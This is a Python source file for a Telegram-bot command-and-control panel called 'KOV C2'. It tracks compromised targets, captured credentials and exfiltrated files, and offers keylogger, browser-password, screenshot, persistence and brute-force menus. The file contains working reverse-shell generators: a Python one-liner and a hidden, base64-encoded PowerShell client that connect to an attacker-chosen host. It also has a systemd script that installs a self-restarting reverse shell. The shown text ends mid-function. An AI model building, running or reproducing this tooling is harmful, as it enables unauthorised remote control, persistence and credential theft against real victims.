#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask
import threading
import os
import sys
import json
import time
import base64
import sqlite3
import shutil
import stat
import struct
import socket
import subprocess
import logging
import tempfile
import zipfile
import io
import re
import platform
from datetime import datetime, timedelta
from pathlib import Path

app = Flask(__name__)

@app.route("/")
def home():
    return "KOV C2 Running"

def install_dependencies():
    required_packages = [
        'python-telegram-bot',
        'cryptography',
        'psutil',
        'requests',
    ]
    
    for pkg in required_packages:
        import_name = pkg.replace('-', '_')
        if import_name == 'python_telegram_bot':
            import_name = 'telegram'
        
        try:
            __import__(import_name)
            print(f"[✓] {pkg}")
        except ImportError:
            print(f"[*] Installing {pkg}...")
            try:
                subprocess.check_call(
                    [sys.executable, '-m', 'pip', 'install', '--quiet', pkg],
                    timeout=120
                )
                print(f"[✓] {pkg} installed")
            except:
                try:
                    termux_pkg = pkg.replace('python-telegram-bot', 'python-telegram-bot') \
                                     .replace('cryptography', 'python-cryptography') \
                                     .replace('psutil', 'python-psutil') \
                                     .replace('requests', 'python-requests')
                    subprocess.check_call(['pkg', 'install', '-y', termux_pkg], timeout=120)
                    print(f"[✓] {pkg} via pkg")
                except:
                    print(f"[!] Failed: {pkg}")

print("[*] Checking dependencies...")
install_dependencies()
print("[*] All dependencies ready!")

try:
    import psutil
    import requests
    from cryptography.fernet import Fernet
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
    from telegram.ext import (
        ApplicationBuilder, CommandHandler, CallbackQueryHandler,
        MessageHandler, filters, ContextTypes, ConversationHandler
    )
    from telegram.constants import ParseMode
except ImportError as e:
    print(f"[!] Import failed: {e}")
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet',
                          'python-telegram-bot', 'cryptography', 'psutil', 'requests'])
    import psutil
    import requests
    from cryptography.fernet import Fernet
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
    from telegram.ext import (
        ApplicationBuilder, CommandHandler, CallbackQueryHandler,
        MessageHandler, filters, ConversationHandler
    )
    from telegram.constants import ParseMode

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = 8571274512
BANNER_URL = "https://res.cloudinary.com/dqxlb29uz/image/upload/v1778756785/bwm_uploads/media-1778756785484.jpg"
DB_PATH = Path.home() / ".d4rk_c2.db"
KEY_PATH = Path.home() / ".d4rk_key.key"
PASS_HASH_PATH = Path.home() / ".d4rk_pass.hash"
ADMINS_PATH = Path.home() / ".d4rk_admins.json"
BANNED_PATH = Path.home() / ".d4rk_banned.json"
USERS_PATH = Path.home() / ".d4rk_users.json"
LOGS_PATH = Path.home() / ".d4rk_logs.json"
NOTIFIED_PATH = Path.home() / ".d4rk_notified.json"

AUTH_PASS, TARGET_SELECT, CUSTOM_CMD, PORT_SCAN, BRUTE_SETUP, LISTENER_SETUP, FILE_UPLOAD, FILE_DOWNLOAD, ADMIN_INPUT, NICKNAME, ADMIN_CHANGE_PASS = range(11)

BOX = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

def load_json(path):
    if path.exists():
        with open(path, 'r', encoding='utf-8') as f:
            return json.load(f)
    return []

def save_json(path, data):
    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def get_users():
    return load_json(USERS_PATH)

def save_user(user_id, nickname):
    users = get_users()
    users = [u for u in users if u['user_id'] != user_id]
    users.append({
        'user_id': user_id,
        'nickname': nickname,
        'first_seen': str(datetime.now()),
        'last_seen': str(datetime.now())
    })
    save_json(USERS_PATH, users)

def update_user_last_seen(user_id):
    users = get_users()
    for u in users:
        if u['user_id'] == user_id:
            u['last_seen'] = str(datetime.now())
            save_json(USERS_PATH, users)
            return

def get_user_nickname(user_id):
    users = get_users()
    for u in users:
        if u['user_id'] == user_id:
            return u.get('nickname', 'Unknown')
    return None

def get_notified_users():
    return load_json(NOTIFIED_PATH)

def mark_notified(user_id):
    notified = get_notified_users()
    if user_id not in notified:
        notified.append(user_id)
        save_json(NOTIFIED_PATH, notified)

def is_notified(user_id):
    return user_id in get_notified_users()

def get_admins():
    admins = load_json(ADMINS_PATH)
    if ADMIN_ID not in admins:
        admins.append(ADMIN_ID)
        save_json(ADMINS_PATH, admins)
    return admins

def add_admin(user_id):
    admins = get_admins()
    if user_id not in admins:
        admins.append(user_id)
        save_json(ADMINS_PATH, admins)
        return True
    return False

def remove_admin(user_id):
    if user_id == ADMIN_ID:
        return False
    admins = get_admins()
    if user_id in admins:
        admins.remove(user_id)
        save_json(ADMINS_PATH, admins)
        return True
    return False

def get_banned():
    return load_json(BANNED_PATH)

def ban_user(user_id):
    banned = get_banned()
    if user_id not in banned:
        banned.append(user_id)
        save_json(BANNED_PATH, banned)
        return True
    return False

def unban_user(user_id):
    banned = get_banned()
    if user_id in banned:
        banned.remove(user_id)
        save_json(BANNED_PATH, banned)
        return True
    return False

def is_admin(user_id):
    return user_id in get_admins()

def is_owner(user_id):
    return user_id == ADMIN_ID

def is_banned(user_id):
    return user_id in get_banned()

def is_authenticated(context, user_id):
    return context.user_data.get('authenticated', False) or is_admin(user_id)

def get_db():
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.executescript('''
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            hostname TEXT NOT NULL,
            ip TEXT NOT NULL,
            os TEXT,
            username TEXT,
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'active',
            listener_port INTEGER DEFAULT 4444,
            encryption_key TEXT
        );
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            session_id TEXT UNIQUE,
            shell_type TEXT DEFAULT 'reverse',
            active INTEGER DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            command TEXT NOT NULL,
            output TEXT,
            status TEXT DEFAULT 'pending',
            executed_at TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            filename TEXT NOT NULL,
            filepath TEXT,
            filetype TEXT,
            size INTEGER,
            exfiltrated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            source TEXT,
            url TEXT,
            username TEXT,
            password TEXT,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    ''')
    conn.commit()
    conn.close()

def get_or_create_key():
    if KEY_PATH.exists():
        with open(KEY_PATH, 'rb') as f:
            return Fernet(f.read())
    key = Fernet.generate_key()
    with open(KEY_PATH, 'wb') as f:
        f.write(key)
    return Fernet(key)

cipher = get_or_create_key()

def set_password(password):
    from hashlib import sha256
    h = sha256(password.encode()).hexdigest()
    with open(PASS_HASH_PATH, 'w') as f:
        f.write(h)

def check_password(password):
    from hashlib import sha256
    if not PASS_HASH_PATH.exists():
        set_password("d4rk123")
        return password == "d4rk123"
    with open(PASS_HASH_PATH, 'r') as f:
        stored = f.read().strip()
    return sha256(password.encode()).hexdigest() == stored

def add_log(action, admin_id, target_id=None, details=None):
    logs = load_json(LOGS_PATH)
    log_entry = {
        'timestamp': str(datetime.now()),
        'action': action,
        'admin_id': admin_id,
        'target_id': target_id,
        'details': details
    }
    logs.append(log_entry)
    if len(logs) > 500:
        logs = logs[-500:]
    save_json(LOGS_PATH, logs)

def get_logs(limit=20):
    logs = load_json(LOGS_PATH)
    return logs[-limit:]

def get_public_ip():
    try:
        r = requests.get('https://api.ipify.org?format=json', timeout=5)
        return r.json().get('ip', 'Unknown')
    except:
        try:
            r = requests.get('https://icanhazip.com', timeout=5)
            return r.text.strip()
        except:
            return socket.gethostbyname(socket.gethostname())

def build_start_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔐 LOGIN", callback_data="start_login"),
         InlineKeyboardButton("ℹ️ ABOUT", callback_data="start_about")]
    ]
    return InlineKeyboardMarkup(keyboard)

def build_main_menu(is_owner_user=False):
    keyboard = [
        [InlineKeyboardButton("🎯 TARGETS", callback_data="menu_targets"),
         InlineKeyboardButton("💻 SHELL", callback_data="menu_shell")],
        [InlineKeyboardButton("🔍 SCANNER", callback_data="menu_scan"),
         InlineKeyboardButton("📁 FILES", callback_data="menu_files")],
        [InlineKeyboardButton("💉 PAYLOADS", callback_data="menu_payloads"),
         InlineKeyboardButton("🎧 LISTENER", callback_data="menu_listener")],
        [InlineKeyboardButton("🖥 SYSTEM INFO", callback_data="menu_info"),
         InlineKeyboardButton("📊 STATUS", callback_data="menu_status")],
        [InlineKeyboardButton("🧰 POST-EXPLOIT", callback_data="menu_postex"),
         InlineKeyboardButton("🔨 BRUTE FORCE", callback_data="menu_brute")],
        [InlineKeyboardButton("🌐 CONNECT VPS", callback_data="menu_vps"),
         InlineKeyboardButton("📖 HELP", callback_data="menu_help")],
        [InlineKeyboardButton("🚪 LOGOUT", callback_data="menu_logout")]
    ]
    if is_owner_user:
        keyboard.append([InlineKeyboardButton("⚙ ADMIN PANEL", callback_data="menu_admin")])
    return InlineKeyboardMarkup(keyboard)

def build_admin_menu():
    keyboard = [
        [InlineKeyboardButton("👥 ADD ADMIN", callback_data="admin_add"),
         InlineKeyboardButton("🗑 REMOVE ADMIN", callback_data="admin_remove")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="admin_ban"),
         InlineKeyboardButton("✅ UNBAN USER", callback_data="admin_unban")],
        [InlineKeyboardButton("📋 USERS LIST", callback_data="admin_users_list"),
         InlineKeyboardButton("📋 ADMIN LIST", callback_data="admin_list_admins")],
        [InlineKeyboardButton("📜 ADMIN LOGS", callback_data="admin_logs"),
         InlineKeyboardButton("📊 DASHBOARD", callback_data="admin_dashboard")],
        [InlineKeyboardButton("⚙ VIEW CONFIG", callback_data="admin_view_config"),
         InlineKeyboardButton("🔐 CHANGE PASSWORD", callback_data="admin_change_pass")],
        [InlineKeyboardButton("🔔 NOTIFICATIONS", callback_data="admin_notifications"),
         InlineKeyboardButton("💾 BACKUP", callback_data="admin_backup")],
        [InlineKeyboardButton("🧹 RESET BOT", callback_data="admin_reset")],
        [InlineKeyboardButton("🔙 MAIN MENU", callback_data="menu_back")]
    ]
    return InlineKeyboardMarkup(keyboard)

def build_cancel_keyboard():
    keyboard = [[InlineKeyboardButton("❌ CANCEL", callback_data="admin_cancel")]]
    return InlineKeyboardMarkup(keyboard)

def build_back_keyboard():
    keyboard = [[InlineKeyboardButton("🔙 MAIN MENU", callback_data="menu_back")]]
    return InlineKeyboardMarkup(keyboard)

def build_target_actions_keyboard(target_id):
    keyboard = [
        [InlineKeyboardButton("💻 Shell", callback_data="shell:" + str(target_id)),
         InlineKeyboardButton("🔍 Scan", callback_data="scan:" + str(target_id))],
        [InlineKeyboardButton("📁 Files", callback_data="listfiles:" + str(target_id)),
         InlineKeyboardButton("🔑 Browser Pass", callback_data="browserpass:" + str(target_id))],
        [InlineKeyboardButton("🔗 Persistence", callback_data="persist:" + str(target_id)),
         InlineKeyboardButton("📸 Screenshot", callback_data="screenshot:" + str(target_id))],
        [InlineKeyboardButton("📶 WiFi", callback_data="wifi:" + str(target_id)),
         InlineKeyboardButton("⌨️ Keylogger", callback_data="keylogger:" + str(target_id))],
        [InlineKeyboardButton("❌ Remove", callback_data="remove:" + str(target_id))],
        [InlineKeyboardButton("🔙 MAIN MENU", callback_data="menu_back")]
    ]
    return InlineKeyboardMarkup(keyboard)

def network_scan(target_ip, ports="1-1024"):
    results = []
    try:
        port_range = ports.split('-')
        if len(port_range) == 2:
            start_p, end_p = int(port_range[0]), int(port_range[1])
        else:
            start_p = end_p = int(ports)
        for port in range(start_p, end_p + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    results.append({"port": port, "service": service, "state": "open"})
                sock.close()
            except:
                pass
    except:
        pass
    return results

def generate_reverse_shell(lhost, lport, platform_type="linux"):
    if platform_type == "linux":
        return f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
    elif platform_type == "windows":
        ps_code = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        b64 = base64.b64encode(ps_code.encode()).decode()
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}"
    return "Unsupported platform"

def generate_persistence_script():
    return "#!/bin/bash\ncat > /etc/systemd/system/d4rk-c2.service << 'EOF'\n[Unit]\nDescription=D4RK-K1NG C2 Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/bin/python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])\"\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable d4rk-c2.service\nsystemctl start d4rk-c2.service"

def get_system_info():
    info = {
        "hostname": socket.gethostname(),
        "platform": "Linux",
        "platform_release": "",
        "platform_version": "",
        "architecture": "",
        "processor": "",
        "cpu_count": 0,
        "memory": "Unknown",
        "memory_used": "0%",
        "disk": "Unknown",
        "disk_used": "0%",
        "ip": "",
        "public_ip": "",
        "python_version": sys.version,
        "uptime": "Unknown"
    }
    try:
        info["platform"] = platform.system()
        info["platform_release"] = platform.release()
        info["architecture"] = platform.machine()
        info["processor"] = platform.processor()
    except:
        pass
    try:
        info["cpu_count"] = os.cpu_count()
        info["memory"] = f"{psutil.virtual_memory().total / (1024**3):.2f} GB"
        info["memory_used"] = f"{psutil.virtual_memory().percent}%"
        info["disk"] = f"{psutil.disk_usage('/').total / (1024**3):.2f} GB"
        info["disk_used"] = f"{psutil.disk_usage('/').percent}%"
        info["uptime"] = str(timedelta(seconds=int(time.time() - psutil.boot_time())))
    except:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["ip"] = s.getsockname()[0]
        s.close()
    except:
        info["ip"] = "Unknown"
    info["public_ip"] = get_public_ip()
    return info

def check_access(update, context):
    user_id = update.effective_user.id
    if is_banned(user_id):
        return False
    if not is_authenticated(context, user_id):
        return False
    update_user_last_seen(user_id)
    return True

async def notify_admins(context, message_text, parse_mode=None):
    admins = get_admins()
    for admin_id in admins:
        try:
            await context.bot.send_message(
                chat_id=admin_id,
                text=message_text,
                parse_mode=parse_mode or ParseMode.MARKDOWN
            )
        except:
            pass

async def notify_new_user(context, user_id, username, full_name):
    if is_notified(user_id):
        return
    mark_notified(user_id)
    msg = (
        f"{BOX}\n"
        f"🔔 New User Joined\n"
        f"{BOX}\n"
        f"👤 Username: @{username or 'N/A'}\n"
        f"👤 Name: {full_name}\n"
        f"🆔 ID: `{user_id}`\n"
        f"📅 Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
        f"{BOX}"
    )
    await notify_admins(context, msg)

async def start(update, context):
    user = update.effective_user
    user_id = user.id
    if is_banned(user_id):
        await update.message.reply_text(f"{BOX}\n🚫 ACCESS DENIED\n{BOX}\n\nYou have been banned.", parse_mode=ParseMode.MARKDOWN)
        return
    if is_authenticated(context, user_id):
        context.user_data['authenticated'] = True
        nickname = get_user_nickname(user_id) or user.full_name
        role = "👑 OWNER" if is_owner(user_id) else "🛡️ ADMIN" if is_admin(user_id) else "👤 USER"
        msg = f"{BOX}\n🔥 KOV C2 🔥\n{BOX}\n\nWelcome Back! {nickname}\nRole: {role}\n{BOX}"
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_main_menu(is_owner(user_id)))
        return
    try:
        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=BANNER_URL, caption=f"{BOX}\n🔥 KOV C2 🔥\n{BOX}", parse_mode=ParseMode.MARKDOWN)
    except:
        pass
    msg = f"{BOX}\n🔥 KOV C2 🔥\n{BOX}\n\nDeveloper: D4RK-K1NG\nUser: {user.full_name}\nID: `{user_id}`\n{BOX}\n🔐 Please login"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_start_keyboard())
    await notify_new_user(context, user_id, user.username, user.full_name)

async def login_button_click(update, context):
    query = update.callback_query
    await query.answer()
    if is_banned(query.from_user.id):
        await query.edit_message_text(f"{BOX}\n🚫 BANNED\n{BOX}", parse_mode=ParseMode.MARKDOWN)
        return
    await query.edit_message_text(f"{BOX}\n🔐 LOGIN\n{BOX}\n\nEnter your password:", parse_mode=ParseMode.MARKDOWN, reply_markup=build_cancel_keyboard())
    return AUTH_PASS

async def login_password_receive(update, context):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    if check_password(password):
        context.user_data['authenticated'] = True
        context.user_data['temp_pass_ok'] = True
        await update.message.reply_text(f"{BOX}\n✅ PASSWORD CORRECT\n{BOX}\n\nEnter your nickname:", parse_mode=ParseMode.MARKDOWN, reply_markup=build_cancel_keyboard())
        return NICKNAME
    else:
        await update.message.reply_text("❌ Wrong password! Try again or /cancel", parse_mode=ParseMode.MARKDOWN)
        return AUTH_PASS

async def login_nickname_receive(update, context):
    user_id = update.effective_user.id
    nickname = update.message.text.strip()
    if len(nickname) < 2 or len(nickname) > 30:
        await update.message.reply_text("❌ Nickname must be 2-30 characters. Try again:", parse_mode=ParseMode.MARKDOWN)
        return NICKNAME
    save_user(user_id, nickname)
    role = "👑 OWNER" if is_owner(user_id) else "🛡️ ADMIN" if is_admin(user_id) else "👤 USER"
    msg = f"{BOX}\n✅ LOGIN SUCCESSFUL\n{BOX}\n\nWelcome, {nickname}!\nRole: {role}\nID: `{user_id}`\n{BOX}"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_main_menu(is_owner(user_id)))
    return ConversationHandler.END

async def login_cancel(update, context):
    context.user_data['authenticated'] = False
    if update.callback_query:
        await update.callback_query.edit_message_text(f"{BOX}\n🚫 CANCELLED\n{BOX}", parse_mode=ParseMode.MARKDOWN, reply_markup=build_start_keyboard())
    else:
        await update.message.reply_text(f"{BOX}\n🚫 CANCELLED\n{BOX}", parse_mode=ParseMode.MARKDOWN, reply_markup=build_start_keyboard())
    return ConversationHandler.END

async def login_cmd(update, context):
    user_id = update.effective_user.id
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.", parse_mode=ParseMode.MARKDOWN)
        return
    if is_authenticated(context, user_id):
        await update.message.reply_text("✅ Already logged in! Use /menu", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) == 0:
        await update.message.reply_text("Usage: /login <password>", parse_mode=ParseMode.MARKDOWN)
        return
    if check_password(context.args[0]):
        context.user_data['authenticated'] = True
        nickname = get_user_nickname(user_id)
        if nickname:
            role = "👑 OWNER" if is_owner(user_id) else "🛡️ ADMIN" if is_admin(user_id) else "👤 USER"
            msg = f"{BOX}\n✅ LOGIN SUCCESSFUL\n{BOX}\n\nWelcome Back, {nickname}!\nRole: {role}\n{BOX}"
            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_main_menu(is_owner(user_id)))
        else:
            context.user_data['temp_pass_ok'] = True
            await update.message.reply_text(f"{BOX}\n✅ PASSWORD CORRECT\n{BOX}\n\nEnter your nickname:", parse_mode=ParseMode.MARKDOWN)
            return NICKNAME
    else:
        await update.message.reply_text("❌ Incorrect password!", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def setpass(update, context):
    user_id = update.effective_user.id
    if not is_authenticated(context, user_id):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    if not is_admin(user_id):
        await update.message.reply_text("❌ Access Denied - Only admins can change password.", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /setpass <new_password>", parse_mode=ParseMode.MARKDOWN)
        return
    set_password(context.args[0])
    add_log("password_changed", user_id, details="Password changed")
    await update.message.reply_text("✅ Password updated!", parse_mode=ParseMode.MARKDOWN)

async def menu(update, context):
    user_id = update.effective_user.id
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.", parse_mode=ParseMode.MARKDOWN)
        return
    if not check_access(update, context):
        await update.message.reply_text("🔐 Use /login <password> first", parse_mode=ParseMode.MARKDOWN)
        return
    nickname = get_user_nickname(user_id) or update.effective_user.full_name
    role = "👑 OWNER" if is_owner(user_id) else "🛡️ ADMIN" if is_admin(user_id) else "👤 USER"
    msg = f"{BOX}\n📋 MAIN MENU\n{BOX}\n\nWelcome, {nickname}\nRole: {role}\n\nSelect an option:"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_main_menu(is_owner(user_id)))

async def help_cmd(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    help_text = f"{BOX}\n📖 KOV C2 COMMANDS\n{BOX}\n\n/login <pass>\n/setpass <pass>\n/menu\n/targets\n/addtarget <host> <ip>\n/removetarget <id>\n/shell <id>\n/cmd <id> <cmd>\n/scan <id> [ports]\n/nmap <target> [args]\n/osint <target>\n/upload <id>\n/listfiles <id>\n/screenshot <id>\n/persistence <id>\n/browserpass <id>\n/wifi <id>\n/keylogger <id>\n/brute <target> <user> <wordlist>\n/payload <host> <port> [os]\n/listener <port>\n/stoplistener\n/vps\n/connect <port>\n/info\n/status\n/cleanup\n\nDeveloper: D4RK-K1NG"
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def admin_panel(update, context):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Access Denied - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    msg = f"{BOX}\n⚙ ADMIN PANEL\n{BOX}\n\nManage administrators and bans:"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())

async def add_admin_cmd(update, context):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Access Denied - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /addadmin <telegram_id>", parse_mode=ParseMode.MARKDOWN)
        return
    try:
        target_id = int(context.args[0])
        if add_admin(target_id):
            await update.message.reply_text(f"✅ Admin Added\nID: `{target_id}`", parse_mode=ParseMode.MARKDOWN)
            add_log("admin_added", user_id, target_id)
            try:
                await context.bot.send_message(chat_id=target_id, text=f"{BOX}\n🎉 You have been promoted\n{BOX}\nRole: Administrator\n\nUse /start to begin.", parse_mode=ParseMode.MARKDOWN)
            except:
                pass
            await notify_admins(context, f"{BOX}\n🔔 User Promoted\n{BOX}\nID: `{target_id}`\nNew admin added.", ParseMode.MARKDOWN)
        else:
            await update.message.reply_text(f"ℹ️ User `{target_id}` is already an admin.", parse_mode=ParseMode.MARKDOWN)
    except ValueError:
        await update.message.reply_text("❌ Invalid ID.", parse_mode=ParseMode.MARKDOWN)

async def remove_admin_cmd(update, context):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Access Denied - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /removeadmin <telegram_id>", parse_mode=ParseMode.MARKDOWN)
        return
    try:
        target_id = int(context.args[0])
        if target_id == ADMIN_ID:
            await update.message.reply_text("❌ Cannot remove owner.", parse_mode=ParseMode.MARKDOWN)
            return
        if remove_admin(target_id):
            await update.message.reply_text(f"✅ Admin Removed\nID: `{target_id}`", parse_mode=ParseMode.MARKDOWN)
            add_log("admin_removed", user_id, target_id)
            try:
                await context.bot.send_message(chat_id=target_id, text=f"{BOX}\n⚠ Administrator role removed.\n{BOX}\n\nYou no longer have admin access.", parse_mode=ParseMode.MARKDOWN)
            except:
                pass
        else:
            await update.message.reply_text(f"ℹ️ User `{target_id}` is not an admin.", parse_mode=ParseMode.MARKDOWN)
    except ValueError:
        await update.message.reply_text("❌ Invalid ID.", parse_mode=ParseMode.MARKDOWN)

async def ban_cmd(update, context):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Access Denied - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /ban <telegram_id>", parse_mode=ParseMode.MARKDOWN)
        return
    try:
        target_id = int(context.args[0])
        if target_id == ADMIN_ID or is_admin(target_id):
            await update.message.reply_text("❌ Cannot ban an admin.", parse_mode=ParseMode.MARKDOWN)
            return
        if ban_user(target_id):
            await update.message.reply_text(f"✅ User Banned\nID: `{target_id}`", parse_mode=ParseMode.MARKDOWN)
            add_log("user_banned", user_id, target_id)
        else:
            await update.message.reply_text(f"ℹ️ User `{target_id}` is already banned.", parse_mode=ParseMode.MARKDOWN)
    except ValueError:
        await update.message.reply_text("❌ Invalid ID.", parse_mode=ParseMode.MARKDOWN)

async def unban_cmd(update, context):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Access Denied - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /unban <telegram_id>", parse_mode=ParseMode.MARKDOWN)
        return
    try:
        target_id = int(context.args[0])
        if unban_user(target_id):
            await update.message.reply_text(f"✅ User Unbanned\nID: `{target_id}`", parse_mode=ParseMode.MARKDOWN)
            add_log("user_unbanned", user_id, target_id)
        else:
            await update.message.reply_text(f"ℹ️ User `{target_id}` is not banned.", parse_mode=ParseMode.MARKDOWN)
    except ValueError:
        await update.message.reply_text("❌ Invalid ID.", parse_mode=ParseMode.MARKDOWN)

async def list_admins_cmd(update, context):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Access Denied - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    admins = get_admins()
    msg = f"{BOX}\n👥 ADMINISTRATORS\n{BOX}\n"
    for aid in admins:
        nickname = get_user_nickname(aid) or "Unknown"
        tag = " 👑 OWNER" if aid == ADMIN_ID else ""
        msg += f"  • `{aid}` ({nickname}){tag}\n"
    msg += f"\nTotal: `{len(admins)}`"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def ban_list_cmd(update, context):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Access Denied - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    banned = get_banned()
    if not banned:
        await update.message.reply_text("✅ No users banned.", parse_mode=ParseMode.MARKDOWN)
        return
    msg = f"{BOX}\n🚫 BANNED USERS\n{BOX}\n"
    for bid in banned:
        nickname = get_user_nickname(bid) or "Unknown"
        msg += f"  • `{bid}` ({nickname})\n"
    msg += f"\nTotal: `{len(banned)}`"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def users_list_cmd(update, context):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Access Denied - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    users = get_users()
    if not users:
        await update.message.reply_text("📭 No users registered.", parse_mode=ParseMode.MARKDOWN)
        return
    msg = f"{BOX}\n👤 USERS\n{BOX}\n"
    for u in users:
        tag = " 👑" if is_owner(u['user_id']) else " 🛡️" if is_admin(u['user_id']) else ""
        btag = " 🚫" if is_banned(u['user_id']) else ""
        msg += f"  • `{u['user_id']}` ({u['nickname']}){tag}{btag}\n"
    msg += f"\nTotal: `{len(users)}`"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def reset_bot(update, context):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Access Denied - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    keyboard = [[InlineKeyboardButton("✅ YES", callback_data="reset_confirm")], [InlineKeyboardButton("❌ NO", callback_data="admin_cancel")]]
    await update.message.reply_text(f"{BOX}\n⚠️ RESET BOT\n{BOX}\n\nThis deletes everything except owner.\nReset password to d4rk123\n\nAre you sure?", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def reset_confirm(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text("❌ Access Denied", parse_mode=ParseMode.MARKDOWN)
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("DELETE FROM targets"); c.execute("DELETE FROM sessions"); c.execute("DELETE FROM commands"); c.execute("DELETE FROM files"); c.execute("DELETE FROM credentials")
    conn.commit()
    conn.close()
